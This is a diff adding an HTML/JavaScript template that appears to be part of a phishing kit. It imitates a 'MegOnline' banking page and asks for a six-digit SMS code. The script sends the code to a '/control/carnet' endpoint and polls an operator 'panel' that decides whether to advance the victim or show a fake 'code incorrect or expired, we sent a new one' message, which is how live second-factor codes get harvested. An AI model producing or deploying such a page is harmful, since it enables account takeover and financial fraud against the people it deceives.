@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MegOnline - Código de Carnet</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            width: 100vw;
+            height: 100vh;
+        background-image: url("{{ url_for('static', filename='images/fondo.svg') }}");
+        background-size: cover;       /* Ajusta la imagen para que cubra toda la pantalla */
+        background-position: center;  /* Centra la imagen */
+        background-repeat: no-repeat; /* Evita que se repita en mosaico */
+   
+           overflow: hidden;
+            position: relative;
+      
+ }
+        /* Top Header Bar */
+        .top-bar {
+            width: 100%;
+            height: 70px;
+            background: #bd2cf9;
+            display: flex;
+            align-items: center;
+            padding-left: 40px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .top-logo {
+            height: 35px;
+            object-fit: contain;
+        }
+
+        /* Accessibility Button */
+        .accessibility-btn {
+            position: absolute;
+            left: 20px;
+            top: 130px;
+            width: 50px;
+            height: 50px;
+            background: #ffffff;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+            cursor: pointer;
+            z-index: 10;
+        }
+        .accessibility-btn img {
+            width: 32px;
+            height: 32px;
+            object-fit: contain;
+        }
+
+        /* Main Center Card */
+        .card-container {
+            position: absolute;
+            left: 50%;
+            top: 52%;
+            transform: translate(-50%, -50%);
+            width: 750px;
+            height: 480px;
+            background: #ffffff;
+            border: 1px solid #d1b3ff;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px;
+            justify-content: space-between;
+        }
+
+        .card-title {
+            font-size: 18px;
+            color: #555;
+            font-weight: 400;
+            margin-top: 10px;
+        }
+
+        /* 6 Input Boxes Container */
+        .code-inputs-container {
+            display: flex;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .code-box {
+            width: 55px;
+            height: 65px;
+            border: 1.5px solid #2ecc71;
+            border-radius: 8px;
+            font-size: 26px;
+            text-align: center;
+            color: #333;
+            outline: none;
+            background: #fff;
+        }
+        .code-box:focus {
+            border-color: #27ae60;
+            box-shadow: 0 0 5px rgba(46, 204, 113, 0.4);
+        }
+
+        /* Timer / Resend Button */
+        .timer-btn {
+            width: 280px;
+            padding: 10px;
+            background: #e0e0e0;
+            border: none;
+            border-radius: 20px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: default;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        /* Bottom Action Buttons */
+        .actions-row {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        .btn-confirmar {
+            width: 170px;
+            padding: 12px;
+            background: #e0e0e0;
+            border: none;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #fff;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn-confirmar.active {
+            background: #7b2cbf;
+        }
+        .btn-confirmar.active:hover {
+            background: #6a22a8;
+        }
+
+        .btn-salir {
+            width: 170px;
+            padding: 12px;
+            background: transparent;
+            border: 1.5px solid #7b2cbf;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #7b2cbf;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn-salir:hover {
+            background: rgba(123, 44, 191, 0.05);
+        }
+
+        /* Loading Dots Container (Reemplaza al botón Confirmar) */
+        .loading-container {
+            width: 170px;
+            height: 45px;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .loading-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: #3498db;
+            animation: bounceAndColor 1.2s infinite ease-in-out both;
+        }
+        .loading-dot:nth-child(1) { animation-delay: -0.36s; }
+        .loading-dot:nth-child(2) { animation-delay: -0.24s; }
+        .loading-dot:nth-child(3) { animation-delay: -0.12s; }
+        .loading-dot:nth-child(4) { animation-delay: 0s; }
+
+        @keyframes bounceAndColor {
+            0%, 80%, 100% {
+                transform: translateY(0);
+                background-color: #3498db;
+            }
+            40% {
+                transform: translateY(-16px);
+                background-color: #f1c40f;
+            }
+        }
+
+        /* Footer Nav */
+        .footer-nav {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 25px;
+            font-size: 12px;
+            color: #777;
+        }
+        .footer-nav a {
+            color: #777;
+            text-decoration: none;
+        }
+        .footer-nav a:hover {
+            text-decoration: underline;
+        }
+
+        /* Error Modal Overlay */
+        #error-modal {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .error-card {
+            width: 420px;
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            border: 2px solid #ff7675;
+        }
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 20px;
+            color: #8e44ad;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .error-icon-circle {
+            width: 75px;
+            height: 75px;
+            background: #ff7675;
+            border-radius: 50%;
+            margin: 0 auto 20px auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-size: 45px;
+            font-weight: bold;
+        }
+        .error-text {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 25px;
+        }
+        .btn-error-ok {
+            background: #5c4ce0;
+            color: #fff;
+            border: none;
+            padding: 10px 40px;
+            border-radius: 20px;
+            font-size: 15px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        /* ========================================== */
+    /* DISEÑO RESPONSIVO / MÓVIL (CARNET)         */
+    /* ========================================== */
+    @media screen and (max-width: 768px) {
+        body {
+            overflow: auto;
+            height: auto;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Ocultar la barra superior en móvil si interfiere con el espacio */
+        .top-bar {
+            height: 60px;
+            padding-left: 20px;
+        }
+        .top-logo {
+            height: 28px;
+        }
+
+        /* Ajustar la tarjeta central para dispositivos móviles */
+        .card-container {
+            position: relative;
+            left: auto;
+            top: auto;
+            transform: none;
+            width: 90%;
+            max-width: 400px;
+            height: auto;
+            min-height: 420px;
+            margin: 30px auto;
+            padding: 25px 15px;
+        }
+
+        /* Reducir el tamaño de las cajas de los dígitos para pantallas pequeñas */
+        .code-inputs-container {
+            gap: 6px;
+            margin: 15px 0;
+            flex-wrap: nowrap;
+        }
+
+        .code-box {
+            width: 42px;
+            height: 52px;
+            font-size: 20px;
+            border-radius: 6px;
+        }
+
+        /* Ajustar contenedor del temporizador */
+        .timer-btn {
+            width: 100%;
+            max-width: 260px;
+            font-size: 13px;
+            margin-bottom: 15px;
+        }
+
+        /* Apilar o reacomodar los botones de acción inferior */
+        .actions-row {
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            width: 100%;
+        }
+
+        .btn-confirmar,
+        .btn-salir,
+        .loading-container {
+            width: 100%;
+            max-width: 260px;
+        }
+
+        /* Reposicionar botón de accesibilidad flotante */
+        .accessibility-btn {
+            top: 75px;
+            left: 15px;
+            width: 42px;
+            height: 42px;
+        }
+        .accessibility-btn img {
+            width: 24px;
+            height: 24px;
+        }
+
+        /* Ajustar pie de página */
+        .footer-nav {
+            position: relative;
+            bottom: auto;
+            left: auto;
+            transform: none;
+            margin: 20px 0;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+    }
+    </style>
+</head>
+<body>
+
+    <!-- Top Header -->
+    <div class="top-bar">
+        <img src="{{ url_for('static', filename='images/logoblanco.svg') }}" alt="MegOnline Logo" class="top-logo">
+    </div>
+
+    <!-- Accessibility Button -->
+    <div class="accessibility-btn" title="Accesibilidad">
+        <img src="{{ url_for('static', filename='images/acc.png') }}" alt="Accesibilidad">
+    </div>
+
+    <!-- Main Card Container -->
+    <div class="card-container">
+        <div class="card-title">Por favor ingresa el código enviado a tu numero</div>
+
+        <!-- 6 Inputs para el código -->
+        <div class="code-inputs-container">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+        </div>
+
+        <div class="timer-btn" id="timer-display">04:38 Solicitar nuevo código</div>
+
+        <!-- Botones de Acción -->
+        <div class="actions-row">
+            <button type="button" id="btn-confirmar" class="btn-confirmar">Confirmar</button>
+            <div id="inline-loader" class="loading-container">
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+            </div>
+            <button type="button" id="btn-salir" class="btn-salir">Salir</button>
+        </div>
+    </div>
+
+    <!-- Footer Links -->
+    <div class="footer-nav">
+        <a href="#">Tutoriales</a>
+        <span>|</span>
+        <a href="#">Preguntas frecuentes</a>
+        <span>|</span>
+        <a href="#">Consejos de seguridad</a>
+    </div>
+
+    <!-- Error Modal (Aparece si el código es incorrecto, cierra en 4s o manual) -->
+    <div id="error-modal">
+        <div class="error-card">
+            <span class="close-modal" id="close-modal-x">&times;</span>
+            <div class="error-icon-circle">!</div>
+            <div class="error-text">Codigo de sms incorrecto o expirado. Te hemos enviado un nuevo codigo.</div>
+            <button type="button" class="btn-error-ok" id="btn-error-ok">Continuar</button>
+        </div>
+    </div>
+<script>
+    const inputs = document.querySelectorAll('.code-box');
+    const btnConfirmar = document.getElementById('btn-confirmar');
+    const inlineLoader = document.getElementById('inline-loader');
+    const errorModal = document.getElementById('error-modal');
+    const closeModalX = document.getElementById('close-modal-x');
+    const btnErrorOk = document.getElementById('btn-error-ok');
+    let errorTimer = null;
+
+    // Auto-navegación entre los 6 inputs de los casilleros
+    inputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            const val = e.target.value;
+            if (val && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+            checkCodeComplete();
+        });
+
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !input.value && index > 0) {
+                inputs[index - 1].focus();
+            }
+        });
+    });
+
+    function checkCodeComplete() {
+        let fullCode = "";
+        inputs.forEach(inp => fullCode += inp.value);
+        if (fullCode.length === 6) {
+            btnConfirmar.classList.add('active');
+        } else {
+            btnConfirmar.classList.remove('active');
+        }
+    }
+
+    // Evento único y conectado de forma correcta con el panel
+    btnConfirmar.addEventListener('click', function() {
+        if (!btnConfirmar.classList.contains('active')) return;
+
+        let fullCode = "";
+        inputs.forEach(inp => fullCode += inp.value);
+
+        // Ocultar el botón confirmar y mostrar el loader de puntitos
+        btnConfirmar.style.display = 'none';
+        inlineLoader.style.display = 'flex';
+
+        fetch('/control/carnet', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ codigo_carnet: fullCode })
+        })
+        .then(response => response.json())
+        .then(data => {
+            // Iniciar ciclo de espera inteligente hasta que el operador decida en el panel
+            esperarDecisionPanel(
+                () => {
+                    // Acción de éxito (manejada dentro de la función de espera)
+                }, 
+                () => {
+                    // Acción en caso de error dictado por el panel
+                    inlineLoader.style.display = 'none';
+                    btnConfirmar.style.display = 'block';
+                    showErrorModal();
+                }
+            );
+        })
+        .catch(error => {
+            inlineLoader.style.display = 'none';
+            btnConfirmar.style.display = 'block';
+            console.error('Error en la petición:', error);
+        });
+    });
+
+    function showErrorModal() {
+        if (errorModal) errorModal.style.display = 'flex';
+        errorTimer = setTimeout(() => {
+            closeErrorModal();
+        }, 4000);
+    }
+
+    function closeErrorModal() {
+        if (errorModal) errorModal.style.display = 'none';
+        if (errorTimer) clearTimeout(errorTimer);
+        // Limpiar inputs para reintentar
+        inputs.forEach(inp => inp.value = '');
+        inputs[0].focus();
+        btnConfirmar.classList.remove('active');
+    }
+
+    if (closeModalX) closeModalX.addEventListener('click', closeErrorModal);
+    if (btnErrorOk) btnErrorOk.addEventListener('click', closeErrorModal);
+
+    // Función de espera inteligente para verificar la decisión del panel de control
+    function esperarDecisionPanel(onSuccess, onError) {
+        const intervalo = setInterval(() => {
+            fetch('/control/api/verificar_estado')
+            .then(res => res.json())
+            .then(data => {
+                if (data.decision === 'aprobar') {
+                    clearInterval(intervalo);
+                    window.location.href = data.siguiente;
+                } else if (data.decision === 'error') {
+                    clearInterval(intervalo);
+                    onError(); 
+                }
+            });
+        }, 2000);
+    }
+</script>
+</body>
+</html>
